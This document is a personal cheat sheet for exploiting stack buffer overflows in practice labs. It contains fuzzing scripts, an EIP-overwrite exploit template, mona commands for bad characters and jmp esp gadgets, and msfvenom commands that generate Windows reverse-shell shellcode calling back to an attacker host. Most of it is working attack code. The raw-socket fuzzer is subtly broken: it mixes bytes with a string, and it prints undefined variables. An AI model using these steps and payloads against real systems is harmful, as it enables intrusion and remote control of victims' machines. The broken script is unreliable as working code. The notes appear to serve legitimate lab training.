# My methodology

## Fuzzing

### Raw sockets

```python
#!/usr/bin/env python3
import socket, time, sys

RHOST = "10.10.118.55"
RPORT = 1337
timeout = 2
buffer_step = 100
buffer_size_max = 3000

buffer = b"00001000200030004000500060007000800090011001200130014001500160017001800190021002200230024002500260027002800290031003200330034003500360037003800390041004200430044004500460047004800490051005200530054005500560057005800590061006200630064006500660067006800690071007200730074007500760077007800790081008200830084008500860087008800890091009200930094009500960097009800990101020103010401050106010701080109011101120113011401150116011701180119012101220123012401250126012701280129013101320133013401350136013701380139014101420143014401450146014701480149015101520153015401550156015701580159016101620163016401650166016701680169017101720173017401750176017701780179018101820183018401850186018701880189019101920193019401950196019701980199020203020402050206020702080209021102120213021402150216021702180219022102220223022402250226022702280229023102320233023402350236023702380239024102420243024402450246024702480249025102520253025402550256025702580259026102620263026402650266026702680269027102720273027402750276027702780279028102820283028402850286028702880289029102920293029402950296029702980299030304030503060307030803090311031203130314031503160317031803190321032203230324032503260327032803290331033203330334033503360337033803390341034203430344034503460347034803490351035203530354035503560357035803590361036203630364036503660367036803690371037203730374037503760377037803790381038203830384038503860387038803890391039203930394039503960397039803990404050406040704080409041104120413041404150416041704180419042104220423042404250426042704280429043104320433043404350436043704380439044104420443044404450446044704480449045104520453045404550456045704580459046104620463046404650466046704680469047104720473047404750476047704780479048104820483048404850486048704880489049104920493049404950496049704980499050506050705080509051105120513051405150516051705180519052105220523052405250526052705280529053105320533053405350536053705380539054105420543054405450546054705480549055105520553055405550556055705580559056105620563056405650566056705680569057105720573057405750576057705780579058105820583058405850586058705880589059105920593059405950596059705980599060607060806090611061206130614061506160617061806190621062206230624062506260627062806290631063206330634063506360637063806390641064206430644064506460647064806490651065206530654065506560657065806590661066206630664066506660667066806690671067206730674067506760677067806790681068206830684068506860687068806890691069206930694069506960697069806990707080709071107120713071407150716071707180719072107220723072407250726072707280729073107320733073407350736073707380739074107420743074407450746074707480749075107520753075407550756075707580759076107620763076407650766076707680769077107720773077407750776077707780779078107820783078407850786078707880789079107920793079407950796079707980799080809081108120813081408150816081708180819082108220823082408250826082708280829083108320833083408350836083708380839084108420843084408450846084708480849085108520853085408550856085708580859086108620863086408650866086708680869087108720873087408750876087708780879088108820883088408850886088708880889089108920893089408950896089708980899090911091209130914091509160917091809190921092209230924092509260927092809290931093209330934093509360937093809390941094209430944094509460947094809490951095209530954095509560957095809590961096209630964096509660967096809690971097209730974097509760977097809790981098209830984098509860987098809890991099209930994099509960997099809991111211131114111511161117111811191122112311241125112611271128112911321133113411351136113711381139114211431144114511461147114811491152115311541155115611571158115911621163116411651166116711681169117211731174117511761177117811791182118311841185118611871188118911921193119411951196119711981199121213121412151216121712181219122212231224122512261227122812291232123312341235123612371238123912421243124412451246124712481249125212531254125512561257125812591262126312641265126612671268126912721273127412751276127712781279128212831284128512861287128812891292129312941295129612971298129913131413151316131713181319132213231324132513261327132813291332133313341335133613371338133913421343134413451346134713481349135213531354135513561357135813591362136313641365136613671368136913721373137413751376137713781379138213831384138513861387138813891392139313941395139613971398139914141514161417141814191422142314241425142614271428142914321433143414351436143714381439144214431444144514461447144814491452145314541455145614571458145914621463146414651466146714681469147214731474147514761477147814791482148314841485148614871488148914921493149414951496149714981499151516151715181519152215231524152515261527152815291532153315341535153615371538153915421543154415451546154715481549155215531554155515561557155815591562156315641565156615671568156915721573157415751576157715781579158215831584158515861587158815891592159315941595159615971598159916161716181619162216231624162516261627162816291632163316341635163616371638163916421643164416451646164716481649165216531654165516561657165816591662166316641665166616671668166916721673167416751676167716781679168216831684168516861687168816891692169316941695169616971698169917171817191722172317241725172617271728172917321733173417351736173717381739174217431744174517461747174817491752175317541755175617571758175917621763176417651766176717681769177217731774177517761777177817791782178317841785178617871788178917921793179417951796179717981799181819182218231824182518261827182818291832183318341835183618371838183918421843184418451846184718481849185218531854185518561857185818591862186318641865186618671868186918721873187418751876187718781879188218831884188518861887188818891892189318941895189618971898189919192219231924192519261927192819291932193319341935193619371938193919421943194419451946194719481949195219531954195519561957195819591962196319641965196619671968196919721973197419751976197719781979198219831984198519861987198819891992199319941995199619971998199922223222422252226222722282229223322342235223622372238223922432244224522462247224822492253225422552256225722582259226322642265226622672268226922732274227522762277227822792283228422852286228722882289229322942295229622972298229923232423252326232723282329233323342335233623372338233923432344234523462347234823492353235423552356235723582359236323642365236623672368236923732374237523762377237823792383238423852386238723882389239323942395239623972398239924242524262427242824292433243424352436243724382439244324442445244624472448244924532454245524562457245824592463246424652466246724682469247324742475247624772478247924832484248524862487248824892493249424952496249724982499252526252725282529253325342535253625372538253925432544254525462547254825492553255425552556255725582559256325642565256625672568256925732574257525762577257825792583258425852586258725882589259325942595259625972598259926262726282629263326342635263626372638263926432644264526462647264826492653265426552656265726582659266326642665266626672668266926732674267526762677267826792683268426852686268726882689269326942695269626972698269927272827292733273427352736273727382739274327442745274627472748274927532754275527562757275827592763276427652766276727682769277327742775277627772778277927832784278527862787278827892793279427952796279727982799282829283328342835283628372838283928432844284528462847284828492853285428552856285728582859286328642865286628672868286928732874287528762877287828792883288428852886288728882889289328942895289628972898289929293329342935293629372938293929432944294529462947294829492953295429552956295729582959296329642965296629672968296929732974297529762977297829792983298429852986298729882989299329942995299629972998299933334333533363337333833393344334533463347334833493354335533563357335833593364336533663367336833693374337533763377337833793384338533863387338833893394339533963397339833993434353436343734383439344434453446344734483449345434553456345734583459346434653466346734683469347434753476347734783479348434853486348734883489349434953496349734983499353536353735383539354435453546354735483549355435553556355735583559"

for i in range(0, buffer_size_max, buffer_step):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((RHOST, RPORT))
        s.recv(1024)
        s.send(b"OVERFLOW2 "+buffer[:i]+"\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

### Boofuzz

```python
#!/usr/bin/env python3
from boofuzz import *

RHOST = "127.0.0.1"
RPORT = 9999

s = Session(target=Target(connection=SocketConnection(RHOST,RPORT,proto="tcp")))

s_initialize("OSCP_OVERFLOW1")
s_string("OVERFLOW1", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("fuzzme")

s.connect(s_get("OSCP_OVERFLOW1"))
s.fuzz()
```

## Finding and controlling EIP

```python
#!/usr/bin/env python3
import socket

ip = "10.10.64.104"
port = 1337

offset = 1978

buf  = b""
buf += b"OVERFLOW1 " # prefix
buf += b"1" * offset # overflow
buf += b"2222" # return
buf += b"\x90"*16 # padding
buf += b"" # payload
buf += b"" # postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending buffer...")
    s.send(buf + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

## Finding bad characters

`!mona bytearray -b "\x00"`

```python
#!/usr/bin/env python3
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print()
```

`!mona compare -f .\bytearray.bin -a <address>`

## Finding the right module

You can list modules with `!mona modules` command, and find unsecure module.

Then try to find position of `jmp esp` instruction\(`FF E4`\)

```bash
!mona jmp -r esp
!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
!mona find -s "\xff\xe4" -m <unsecure_module>
```

## Generating shellcode

```bash
msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> EXITFUNC=thread -f c -a <architecture> -b <bad_bytes>

msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -b "\x00" -f py

# example
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8990 EXITFUNC=thread -f c -a x86 -b "\x00"
```

## Root

